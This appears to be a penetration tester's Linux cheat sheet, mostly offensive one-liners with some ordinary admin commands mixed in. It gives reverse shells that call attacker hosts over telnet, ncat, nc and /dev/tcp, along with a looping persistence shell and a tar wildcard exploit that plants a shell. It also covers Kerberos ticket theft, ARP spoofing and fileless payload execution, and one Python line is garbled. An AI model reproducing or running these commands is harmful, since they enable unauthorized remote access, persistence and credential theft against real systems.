- Reverse shell one-liners:
	- Telnet:
		- `mkfifo /tmp/cth; sh -i 2>&1 </tmp/cth | telnet <atkIP> 8443 >/tmp/cth; rm /tmp/cth`
		- `(touch /dev/shm/cth; sleep 60; rm -f /dev/shm/cth) & tail -f /dev/shm/cth | sh -i 2>&1 | telnet <atkIP> <port> >/dev/shm/cth`
	- Encrypted
		- Ncat
			1. Listener: `ncat —ssl -nlvp 443`
			2. Connector: `ncat —ssl <listener ip> 443 -e /bin/bash`
	- Quick persistence
		- `while :; do setsid bash -i &>/dev/tcp/1.1.1.1/8443 0>&1; sleep 120; done &>/dev/null &`
- Find all files owned by a user in Linux, disregarding /proc and /sys files
	- `find / -user <username> -ls 2>/dev/null | grep -v '/proc\| /run\| /sys'`
- Log everything that happens in a terminal/tmux pane
	- `script <filename.log>`
- Download files
	- BASH only: `bash -c "cat < /dev/tcp/10.13.10.69/18110" > nmap`
	- Encrypted:
		- Encrypt: `openssl enc -aes-256-cbc -pbkdf2 -k strongPass <input.txt >input.txt.enc`
		- Decrypt: `openssl enc -d -aes-256-cbc -pbkdf2 -k strongPass <input.txt.enc >input.txt`
- TAR exploit:
	```BASH
	echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
	echo "" > "--checkpoint-action=exec=sh shell.sh"
	echo "" > --checkpoint=1
	tar cf archive.tar *
	```
- Upgrade reverse shell
	- Using socat (upload static binary)
		- On target: ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
		- On attacker: ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attackerip>:4444```
- Extract Kerberos ccache files
	- ccache files for logged-in users are located in /tmp
		- `scp root@10.10.120.45:/tmp/krb5cc\_613405103\_HEquhW .`
	- Convert ccache file into .kirbi file using impacket
		- `impacket-ticketConverter krb5cc\_613405103\_HEquhW amitchell.kirbi`
	- kerberos_ticket_use to leverage the TGT
- View neighbor IPs (useful for docker containers)
	- `ip ne`
	- `"ip -br -c ne`
- Generate public RSA key from private
	- `ssh-keygen -y -e -f id_rsa`
- IPtables
	- `iptables -A INPUT -s <RHOST> -p tcp --dport <LPORT> -j ACCEPT`
		- Omit `-s` to open a port to connections from all origins
		- `--dport` can accept a range of ports as well as single ports
- ARP
	- See local ARP cache
		- `arp -n`
	- ARP spoof/poisoning
		- `./arplayer spoof -I wlp1s0 -vvv -F -b 192.168.1.101 192.168.1.1`
	- ARP scan
		- `./arplayer scan -I wlp1s0 -w 10 -t 1000`
- NFS Shares
	- Display the NFS server's export list of mountable shares
		- `showmount -e <ip>`
	- List both the client hostname or IP address and mounted directory
		- `showmount -a <ip>`
	- Mount an NFS share located at IP to /mnt/nfs
		- `sudo mount -t nfs <ip>:<share name> /mnt/nfs`
- ss
	- Show listening ports like `netstat -anp tcp`
		- `ss -tulpn`
- Rename terminal
	```BASH
	#!bin/bash
	echo -ne "\033]0;${1}\007"
	```

- Using shar to pack files/tools for target:
	1. Pack files on attack machine: `shar *.exe *.kirbi >a.shar`
	2. Execute on target to extract: `chmod +x a.shar; ./a.shar`

- Propertly destroy file instead of just deleting:
	- `shred -z cthulhu.txt`

- Run files without touching disk
	- Python
		- `python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'`
	- No python:
		- [Ippsec video on LOL](https://www.youtube.com/watch?v=MaBurwnrI4s)
